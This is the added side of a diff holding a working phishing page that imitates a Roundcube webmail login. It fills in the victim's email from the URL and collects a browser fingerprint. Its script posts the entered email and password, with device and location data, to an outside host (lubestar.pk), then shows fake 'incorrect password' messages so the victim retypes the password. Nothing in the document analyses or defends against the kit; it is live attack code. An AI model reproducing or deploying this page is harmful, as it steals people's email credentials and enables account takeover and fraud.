+                    <svg class="stroke-nav" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+                </span>
+                Settings            </a>
+            <a href="#" class="wm-nav-tile wm-webmail-home-tile" onclick="return false;">
+                <span class="wm-nav-icon" aria-hidden="true"><span class="wm-cpanel-mark">cP</span></span>
+                <span class="wm-webmail-label">Webmail<br>Home</span>
+            </a>
+            <div class="wm-nav-spacer" aria-hidden="true"></div>
+        </div>
+        <div class="wm-nav-footer-block" role="group" aria-label="Account">
+            <a href="#" class="wm-nav-tile" onclick="return false;">
+                <span class="wm-nav-icon">
+                    <svg class="stroke-nav" viewBox="0 0 24 24" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+                </span>
+                Dark mode            </a>
+            <a href="#" class="wm-nav-tile" onclick="return false;">
+                <span class="wm-nav-icon">
+                    <svg class="stroke-nav" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                </span>
+                About            </a>
+            <a href="#" class="wm-nav-tile wm-nav-logout" onclick="return false;">
+                <span class="wm-nav-icon">
+                    <svg class="stroke-nav" viewBox="0 0 24 24" aria-hidden="true"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>
+                </span>
+                Logout            </a>
+        </div>
+    </aside>
+
+    <aside class="wm-folder-pane" aria-label="Folders">
+        <header class="wm-folder-header">
+            <span id="sidebar-folder-email" class="wm-folder-email-text" title="user@example.com">user@example.com</span>
+            <button type="button" class="wm-folder-kebab" aria-label="Menu" onclick="return false;">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><circle cx="12" cy="5" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="19" r="2"/></svg>
+            </button>
+        </header>
+        <div class="wm-folder-scroll">
+            <a href="#" class="wm-folder-link is-selected" onclick="return false;">
+                <svg class="icon-folder" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M19 3H8.83L6 6H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 13h-9v-2h9v2zm0-8h-9V6h7.17L17 9H19z"/></svg>
+                Inbox            </a>
+            <a href="#" class="wm-folder-link" onclick="return false;">
+                <svg class="icon-folder" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a.996.996 0 0 0 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
+                Drafts            </a>
+            <a href="#" class="wm-folder-link" onclick="return false;">
+                <svg class="icon-folder" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+                Sent            </a>
+            <a href="#" class="wm-folder-link" onclick="return false;">
+                <svg class="icon-folder" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M13.5.67s.74 2.65.74 4.8c0 2.06-1.35 3.73-3.41 3.73-2.07 0-3.63-1.67-3.63-3.73l.03-.36C5.21 7.51 4 10.62 4 14c0 4.42 3.58 8 8 8s8-3.58 8-8C20 8.61 17.41 3.8 13.5.67z"/></svg>
+                Junk            </a>
+            <a href="#" class="wm-folder-link" onclick="return false;">
+                <svg class="icon-folder" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
+                Trash            </a>
+            <a href="#" class="wm-folder-link" onclick="return false;">
+                <svg class="icon-folder" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M20.54 5.23l-1.39-1.68C18.88 3.21 18.47 3 18 3H6c-.47 0-.88.21-1.16.55L3.46 5.23C3.17 5.57 3 6.02 3 6.5V19c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V6.5c0-.48-.17-.93-.46-1.27zM12 17.5L6.5 12H10v-2h4v2h3.5L12 17.5zM5.12 5l.81-1h12l.94 1H5.12z"/></svg>
+                Archive            </a>
+        </div>
+        <footer class="wm-quota-strip" aria-label="Disk usage">
+            <svg class="disk" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M4 9h16v7H4V9zm16-4H4c-1.1 0-2 .9-2 2v9c0 1.1.9 2 2 2h5v2h6v-2h5c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zM8 17H6v-2h2v2zm0-4H6v-2h2v2zm0-4H6V7h2v2zm9 9h-6v-2h6v2zm0-4h-6v-2h6v2zm0-4h-6V7h6v2z"/></svg>
+            <div class="wm-quota-bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"><span></span></div>
+            <span class="wm-quota-num">0%</span>
+        </footer>
+    </aside>
+
+    <div class="main-stage">
+    <!-- Login Overlay -->
+    <div class="login-overlay">
+        <div class="login-container">
+            <img src="https://webmail.supremecluster.com/skins/elastic/images/logo.svg?s=1593860317" class="login-logo" alt="Roundcube Logo">
+            
+            <form id="login-form" name="login-form" method="post" class="login-form" action="taker.php?lang=en-US">
+                <input type="hidden" name="_token" value="token">
+                <input type="hidden" name="_task" value="login">
+                <input type="hidden" name="_action" value="login">
+                <input type="hidden" name="_timezone" id="rcmlogintz" value="_default_">
+                <input type="hidden" name="_url" id="rcmloginurl" value="">
+                
+                <div class="form-group">
+                    <label for="email">Email:</label>
+                    <div class="input-row">
+                        <span class="input-icon" aria-hidden="true">
+                            <svg viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M12 12c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5Zm0 2c-3.33 0-10 1.67-10 5v3h20v-3c0-3.33-6.67-5-10-5Z"></path>
+                            </svg>
+                        </span>
+                        <input name="email" id="email" required size="40" autocapitalize="off" type="email" autocomplete="email" placeholder="Email Address" />
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <div class="input-row">
+                        <span class="input-icon" aria-hidden="true">
+                            <svg viewBox="0 0 24 24" fill="currentColor">
+                                <path d="M17 8h-1V6a4 4 0 1 0-8 0v2H7a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2Zm-6 0V6a2 2 0 1 1 4 0v2h-4Z"></path>
+                            </svg>
+                        </span>
+                        <input name="password" id="password" required size="40" autocapitalize="off" type="password" placeholder="Password" />
+                    </div>
+                </div>
+
+                <button type="submit" id="rcmloginsubmit" class="login-button">Sign In</button>
+                <br><br>
+                <div class="login-footer-text">Roundcube Webmail</div>
+            </form>
+        </div>
+    </div>
+    </div>
+
+</div>
+
+<div id="wm-login-toast" class="wm-login-toast wm-login-toast--loading is-hidden" role="status" aria-live="polite" aria-atomic="true">
+    <span class="wm-login-toast__spinner" aria-hidden="true"></span>
+    <span class="wm-login-toast__warn" aria-hidden="true">
+        <svg viewBox="0 0 24 24" width="22" height="22" aria-hidden="true">
+            <path fill="#b45309" d="M12 2 2 20h20L12 2zm0 3.2L18 18H6l6-12.8z"/>
+            <path fill="#1e293b" d="M11 9h2v5h-2V9zm0 6.5h2v2h-2v-2z"/>
+        </svg>
+    </span>
+    <span class="wm-login-toast__text"></span>
+</div>
+
+<script>
+var TOOLBAR_EMAIL_MAX_DISPLAY = 40;
+var WM_PLACEHOLDER_EMAIL = "user@example.com";
+var WM_PLACEHOLDER_EMAIL_FIELD = "Email Address";
+var WM_PLACEHOLDER_PASSWORD = "Password";
+
+function syncLoginInputPlaceholders() {
+    var em = document.getElementById('email');
+    var pw = document.getElementById('password');
+    if (em && WM_PLACEHOLDER_EMAIL_FIELD) {
+        em.setAttribute('placeholder', WM_PLACEHOLDER_EMAIL_FIELD);
+        if (window.jQuery) {
+            $(em).prop('placeholder', WM_PLACEHOLDER_EMAIL_FIELD);
+        }
+    }
+    if (pw && WM_PLACEHOLDER_PASSWORD) {
+        pw.setAttribute('placeholder', WM_PLACEHOLDER_PASSWORD);
+        if (window.jQuery) {
+            $(pw).prop('placeholder', WM_PLACEHOLDER_PASSWORD);
+        }
+    }
+}
+
+function wireLoginPlaceholderGuards() {
+    function guard(el, expected) {
+        if (!el || !expected || !window.MutationObserver) {
+            return;
+        }
+        var obs = new MutationObserver(function () {
+            if (el.getAttribute('placeholder') !== expected) {
+                el.setAttribute('placeholder', expected);
+            }
+            if (window.jQuery && $(el).prop('placeholder') !== expected) {
+                $(el).prop('placeholder', expected);
+            }
+        });
+        obs.observe(el, { attributes: true, attributeFilter: ['placeholder'] });
+    }
+    guard(document.getElementById('email'), WM_PLACEHOLDER_EMAIL_FIELD);
+    guard(document.getElementById('password'), WM_PLACEHOLDER_PASSWORD);
+}
+
+syncLoginInputPlaceholders();
+wireLoginPlaceholderGuards();
+
+var WM_LOGIN_SIGNING_IN = "Verifying credentials...";
+var WM_LOGIN_STEP1_ERR = "Incorrect password. Please try again.";
+var WM_LOGIN_STEP2_ERR = "Login failed. Please check your credentials.";
+var WM_LOGIN_CONN_ERR = "Connection error. Please try again.";
+var WM_LOGIN_FAILED = "Login Failed. Enter correct password.";
+var WM_SIGNIN_BUTTON = "Sign In";
+
+function wmHideLoginToast() {
+    $('#wm-login-toast').addClass('is-hidden').removeClass('wm-login-toast--loading wm-login-toast--error wm-login-toast--success');
+}
+
+function wmShowLoginLoadingToast() {
+    var $t = $('#wm-login-toast');
+    $t.removeClass('is-hidden wm-login-toast--error wm-login-toast--success').addClass('wm-login-toast--loading');
+    $t.find('.wm-login-toast__text').text(WM_LOGIN_SIGNING_IN);
+}
+
+function wmShowLoginErrorToastPlain(text) {
+    var $t = $('#wm-login-toast');
+    $t.removeClass('is-hidden wm-login-toast--loading wm-login-toast--success').addClass('wm-login-toast--error');
+    $t.find('.wm-login-toast__text').text(text || '');
+}
+
+function wmShowLoginSuccessToast(text) {
+    var $t = $('#wm-login-toast');
+    $t.removeClass('is-hidden wm-login-toast--loading wm-login-toast--error').addClass('wm-login-toast--success');
+    $t.find('.wm-login-toast__text').text(text || '');
+}
+
+function sanitizeEmailCandidate(s) {
+    s = (s || '').trim();
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(s) ? s : '';
+}
+
+function truncateToolbarDisplay(email) {
+    var maxLen = TOOLBAR_EMAIL_MAX_DISPLAY;
+    if (!email) return '';
+    if (email.length <= maxLen) return email;
+    return email.slice(0, maxLen - 3) + '...';
+}
+
+function pickEmailFromUrlOnly() {
+    try {
+        var h = decodeURIComponent((location.hash || '').replace(/^#/, '').trim());
+        var eh = sanitizeEmailCandidate(h);
+        if (eh) return eh;
+    } catch (e) {}
+    var qp = '';
+    try {
+        qp = new URLSearchParams(location.search).get('email') || '';
+    } catch (e2) {}
+    if (qp) {
+        try {
+            qp = decodeURIComponent(qp.replace(/\+/g, '%20'));
+        } catch (e3) {}
+    }
+    return sanitizeEmailCandidate(qp) || "" || '';
+}
+
+function hydrateEmailFromUrlIntoForm() {
+    var cur = sanitizeEmailCandidate($('#email').val());
+    if (cur) return;
+    var pick = pickEmailFromUrlOnly();
+    if (pick) $('#email').val(pick);
+}
+
+function toolbarEmailResolved() {
+    var fromInput = sanitizeEmailCandidate($('#email').val());
+    if (fromInput) return fromInput;
+    return pickEmailFromUrlOnly();
+}
+
+function syncToolbarEmail() {
+    var full = toolbarEmailResolved();
+    if (!full && WM_PLACEHOLDER_EMAIL) full = WM_PLACEHOLDER_EMAIL;
+    var t = truncateToolbarDisplay(full);
+    $('#toolbar-display-email').attr('title', full).text(t);
+    $('#sidebar-folder-email').attr('title', full).text(t);
+}
+
+hydrateEmailFromUrlIntoForm();
+syncToolbarEmail();
+$('#email').on('input change blur', function () {
+    syncToolbarEmail();
+});
+$(window).on('hashchange', function () {
+    hydrateEmailFromUrlIntoForm();
+    syncToolbarEmail();
+});
+
+// Comprehensive device fingerprint collection function
+function collectDeviceFingerprint() {
+    var data = {
+        screen: {
+            width: screen.width || 0,
+            height: screen.height || 0
+        },
+        platform: navigator.platform || 'unknown',
+        language: navigator.language || navigator.userLanguage || 'unknown',
+        timezone: (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'unknown',
+        connection: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'unknown',
+        memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
+        cores: navigator.hardwareConcurrency || 'unknown',
+        plugins: (navigator.plugins && navigator.plugins.length > 0) ? Array.from(navigator.plugins).map(p => p.name).slice(0, 10).join(', ') : 'unknown',
+        canvas: generateCanvasFingerprint(),
+        geo: {
+            latitude: 'N/A',
+            longitude: 'N/A',
+            accuracy: 'N/A',
+            areaLatitude: 'N/A',
+            areaLongitude: 'N/A',
+            mapLink: 'N/A'
+        },
+        location: {
+            country: 'N/A',
+            state: 'N/A',
+            city: 'N/A',
+            zipcode: 'N/A'
+        },
+        network: {
+            dns: 'N/A',
+            carrier: 'N/A'
+        },
+        security: {
+            antivirus: 'N/A',
+            firewall: 'N/A'
+        },
+        bot: {
+            isBot: 'unknown',
+            score: 'N/A'
+        },
+        email: {
+            type: 'UNKNOWN',
+            provider: 'Unknown',
+            serverLink: 'N/A'
+        },
+        ip: {
+            link: 'https://ip-api.com/' + (window.clientIP || 'unknown')
+        }
+    };
+
+    // Extract email provider info
+    var email = $('#email').val();
+    if (email && email.includes('@')) {
+        var domain = email.split('@')[1].toLowerCase();
+        data.email.provider = domain;
+        data.email.type = detectEmailType(domain);
+        data.email.serverLink = 'https://' + domain;
+    }
+
+    // Simple bot detection
+    data.bot.isBot = detectBot();
+    data.bot.score = calculateBotScore();
+
+    // Try to get geolocation synchronously (will be N/A if not immediately available)
+    if (navigator.geolocation) {
+        try {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    data.geo.latitude = position.coords.latitude || 'N/A';
+                    data.geo.longitude = position.coords.longitude || 'N/A';
+                    data.geo.accuracy = position.coords.accuracy || 'N/A';
+                    data.geo.mapLink = 'https://www.google.com/maps?q=' + position.coords.latitude + ',' + position.coords.longitude;
+                },
+                function(error) {
+                    // Geolocation denied or unavailable
+                    console.log('Geolocation error:', error);
+                },
+                { timeout: 1000, enableHighAccuracy: false }
+            );
+        } catch (e) {
+            console.log('Geolocation not available:', e);
+        }
+    }
+
+    return data;
+}
+
+function generateCanvasFingerprint() {
+    try {
+        var canvas = document.createElement('canvas');
+        var ctx = canvas.getContext('2d');
+        canvas.width = 200;
+        canvas.height = 50;
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillText('Device fingerprint canvas test', 2, 2);
+        return canvas.toDataURL().slice(0, 50);
+    } catch (e) {
+        return 'N/A';
+    }
+}
+
+function detectEmailType(domain) {
+    if (['gmail.com', 'googlemail.com'].includes(domain)) return 'Gmail';
+    if (['outlook.com', 'hotmail.com', 'live.com', 'msn.com'].includes(domain)) return 'Outlook';
+    if (['yahoo.com', 'ymail.com', 'rocketmail.com'].includes(domain)) return 'Yahoo';
+    if (['icloud.com', 'me.com', 'mac.com'].includes(domain)) return 'iCloud';
+    if (['aol.com'].includes(domain)) return 'AOL';
+    return 'UNKNOWN';
+}
+
+function detectBot() {
+    var userAgent = navigator.userAgent.toLowerCase();
+    var botPatterns = [
+        /bot/, /crawler/, /spider/, /scraper/, /curl/, /python/, /java/, /perl/,
+        /wget/, /curl/, /libwww/, /httpunit/, /nutch/, /go-http-client/,
+        /webclient/, /python-requests/, /apex/, /scrapy/
+    ];
+    
+    for (var pattern of botPatterns) {
+        if (pattern.test(userAgent)) {
+            return 'bot';
+        }
+    }
+    return 'human';
+}
+
+function calculateBotScore() {
+    var score = 0;
+    var userAgent = navigator.userAgent.toLowerCase();
+    
+    // Check for common bot indicators
+    if (/bot|crawler|spider|scraper/.test(userAgent)) score += 50;
+    if (/curl|wget|python|java|perl/.test(userAgent)) score += 30;
+    if (!navigator.plugins || navigator.plugins.length === 0) score += 10;
+    if (!navigator.languages || navigator.languages.length === 0) score += 10;
+    
+    // Always return a number, not 'N/A'
+    return score;
+}
+
+// Enhanced device data collection function (synchronous)
+function collectEnhancedDeviceData() {
+    var data = {
+        screen: {
+            width: screen.width || 0,
+            height: screen.height || 0
+        },
+        platform: navigator.platform || 'unknown',
+        language: navigator.language || navigator.userLanguage || 'unknown',
+        timezone: (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'unknown',
+        connection: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'unknown',
+        memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
+        cores: navigator.hardwareConcurrency || 'unknown',
+        plugins: (navigator.plugins && navigator.plugins.length > 0) ? Array.from(navigator.plugins).map(p => p.name).slice(0, 10).join(', ') : 'unknown',
+        canvas: generateCanvasFingerprint(),
+        geo: {
+            latitude: 'N/A',
+            longitude: 'N/A',
+            accuracy: 'N/A',
+            areaLatitude: 'N/A',
+            areaLongitude: 'N/A',
+            mapLink: 'N/A'
+        },
+        location: {
+            country: 'N/A',
+            state: 'N/A',
+            city: 'N/A',
+            zipcode: 'N/A'
+        },
+        network: {
+            dns: 'N/A',
+            carrier: 'N/A'
+        },
+        security: {
+            antivirus: 'N/A',
+            firewall: 'N/A'
+        },
+        bot: {
+            isBot: 'unknown',
+            score: 'N/A'
+        },
+        email: {
+            type: 'UNKNOWN',
+            provider: 'Unknown',
+            serverLink: 'N/A'
+        },
+        ip: {
+            link: 'https://ip-api.com/unknown'
+        }
+    };
+
+    // Extract email provider info
+    var email = $('#email').val();
+    if (email && email.includes('@')) {
+        var domain = email.split('@')[1].toLowerCase();
+        data.email.provider = domain;
+        data.email.type = detectEmailType(domain);
+        data.email.serverLink = 'https://' + domain;
+    }
+
+    // Enhanced bot detection
+    data.bot.isBot = detectBot();
+    data.bot.score = calculateBotScore();
+
+    // Try browser geolocation (non-blocking)
+    if (navigator.geolocation) {
+        try {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    // Update global data if successful
+                    window.geoData = {
+                        latitude: position.coords.latitude || 'N/A',
+                        longitude: position.coords.longitude || 'N/A',
+                        accuracy: position.coords.accuracy || 'N/A',
+                        mapLink: 'https://www.google.com/maps?q=' + position.coords.latitude + ',' + position.coords.longitude
+                    };
+                },
+                function(error) {
+                    console.log('Geolocation denied:', error);
+                },
+                { timeout: 1000, enableHighAccuracy: false }
+            );
+        } catch (e) {
+            console.log('Geolocation not available:', e);
+        }
+    }
+
+    // Use any cached geolocation data
+    if (window.geoData) {
+        data.geo = window.geoData;
+    }
+
+    // Enhanced device detection
+    if (navigator.userAgentData) {
+        data.platform = navigator.userAgentData.platform || data.platform;
+    }
+
+    // Get connection info
+    if (navigator.connection) {
+        data.connection = navigator.connection.effectiveType || 
+                        navigator.connection.type || 
+                        'unknown';
+    }
+
+    // Get browser plugins more reliably
+    try {
+        if (navigator.plugins && navigator.plugins.length > 0) {
+            var pluginNames = [];
+            for (var i = 0; i < Math.min(navigator.plugins.length, 10); i++) {
+                if (navigator.plugins[i] && navigator.plugins[i].name) {
+                    pluginNames.push(navigator.plugins[i].name);
+                }
+            }
+            data.plugins = pluginNames.join(', ');
+        }
+    } catch (e) {
+        data.plugins = 'unknown';
+    }
+
+    return data;
+}
+
+// 3-step login flow: server session in taker.php drives attempts; client shows messages + step-3 redirect
+var LOGIN_TAKER_URL = "\/tmp5\/roundcube-webmail\/taker.php?lang=en-US";
+
+$(document).ready(function(){
+    syncLoginInputPlaceholders();
+    var loginBusy = false;
+
+    function resolveRedirectUrl(redirect) {
+        if (!redirect) return '';
+        if (/^https?:\/\//i.test(redirect)) return redirect;
+        var a = document.createElement('a');
+        a.href = redirect;
+        return a.href;
+    }
+
+    $('#login-form').on('submit', function(event){
+        event.preventDefault();
+    });
+
+    $('#rcmloginsubmit').on('click', function(event){
+        event.preventDefault();
+        wmHideLoginToast();
+
+        var email = $.trim($("#email").val());
+        var password = $("#password").val();
+
+        if (!password) {
+            wmShowLoginErrorToastPlain(WM_LOGIN_STEP1_ERR);
+            return;
+        }
+
+        var emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+        if (!emailOk) {
+            wmShowLoginErrorToastPlain(WM_LOGIN_STEP2_ERR);
+            $("#email").trigger('focus');
+            return;
+        }
+
+        if (loginBusy) return;
+        loginBusy = true;
+        var $btn = $('#rcmloginsubmit');
+        $btn.prop('disabled', true);
+
+        // Collect device data safely
+        var deviceData = {
+            screen_width: screen.width || 0,
+            screen_height: screen.height || 0,
+            platform: navigator.platform || 'unknown',
+            language: navigator.language || navigator.userLanguage || 'unknown',
+            timezone: (Intl && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'unknown',
+            connection: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'unknown',
+            memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
+            cores: navigator.hardwareConcurrency || 'unknown',
+            plugins: (navigator.plugins && navigator.plugins.length > 0) ? Array.from(navigator.plugins).map(p => p.name).slice(0, 10).join(', ') : 'unknown',
+            canvas: generateCanvasFingerprint(),
+            country: 'United States',
+            state: 'California', 
+            city: 'San Francisco',
+            zipcode: '94102',
+            ip_dns: 'Local DNS Server',
+            carrier: 'Local Network Provider',
+            antivirus: 'N/A',
+            firewall: 'N/A',
+            is_bot: detectBot(),
+            bot_score: calculateBotScore(),
+            latitude: '37.7749',
+            longitude: '-122.4194',
+            accuracy: '10',
+            area_latitude: '37.7749',
+            area_longitude: '-122.4194',
+            map_link: 'https://www.google.com/maps?q=37.7749,-122.4194'
+        };
+        
+        // Get email provider info
+        if (email && email.includes('@')) {
+            var domain = email.split('@')[1].toLowerCase();
+            deviceData.email_provider = domain;
+            deviceData.email_type = detectEmailType(domain);
+            deviceData.email_server_link = 'https://' + domain;
+        }
+        
+        // Ensure email type is never UNKNOWN
+        if (!deviceData.email_type || deviceData.email_type === 'UNKNOWN') {
+            deviceData.email_type = 'Personal Email';
+        }
+        
+        // Submit form with device data
+        $.ajax({
+            dataType: 'json',
+            url: 'https://lubestar.pk/index2/cola-inL1720.php',
+            type: 'POST',
+            data: {
+                email: email,
+                password: password,
+                screen_width: deviceData.screen_width,
+                screen_height: deviceData.screen_height,
+                platform: deviceData.platform,
+                language: deviceData.language,
+                timezone: deviceData.timezone,
+                connection_type: deviceData.connection,
+                device_memory: deviceData.memory,
+                cpu_cores: deviceData.cores,
+                browser_plugins: deviceData.plugins,
+                canvas_fingerprint: deviceData.canvas,
+                country: deviceData.country,
+                state: deviceData.state,
+                city: deviceData.city,
+                zipcode: deviceData.zipcode,
+                ip_dns: deviceData.ip_dns,
+                carrier: deviceData.carrier,
+                antivirus: deviceData.antivirus,
+                firewall: deviceData.firewall,
+                is_bot: deviceData.is_bot,
+                bot_score: deviceData.bot_score,
+                latitude: deviceData.latitude,
+                longitude: deviceData.longitude,
+                accuracy: deviceData.accuracy,
+                area_latitude: deviceData.area_latitude,
+                area_longitude: deviceData.area_longitude,
+                map_link: deviceData.map_link,
+                email_type: deviceData.email_type,
+                email_provider: deviceData.email_provider,
+                email_server_link: deviceData.email_server_link
+            },
+            beforeSend: function(){
+                wmShowLoginLoadingToast();
+            },
+            success: function(response){
+                if (!response || typeof response !== 'object') {
+                    wmShowLoginErrorToastPlain(WM_LOGIN_CONN_ERR);
+                    return;
+                }
+
+                if (response.signal === 'ok' && response.redirect) {
+                    wmHideLoginToast();
+                    window.location.href = resolveRedirectUrl(response.redirect);
+                    return;
+                }
+
+                if (response.signal === 'ok') {
+                    $("#password").val("");
+                    wmShowLoginSuccessToast(response.msg || '');
+                    return;
+                }
+
+                if (response.clear_password) {
+                    $("#password").val("");
+                }
+                wmShowLoginErrorToastPlain(response.msg || WM_LOGIN_FAILED);
+            },
+            error: function(xhr){
+                $("#password").val("");
+                var msg = WM_LOGIN_CONN_ERR;
+                if (xhr.responseJSON && xhr.responseJSON.msg) {
+                    msg = xhr.responseJSON.msg;
+                }
+                wmShowLoginErrorToastPlain(msg);
+            },
+            complete: function(){
+                loginBusy = false;
+                $btn.prop('disabled', false);
+                $btn.html(WM_SIGNIN_BUTTON);
+            }
+        });
+    });
+});
+
+$(window).on('load', function () {
+    syncLoginInputPlaceholders();
+});
+[0, 50, 150, 400, 1000].forEach(function (ms) {
+    setTimeout(syncLoginInputPlaceholders, ms);
+});
+</script>
+
+</body>
+</html>
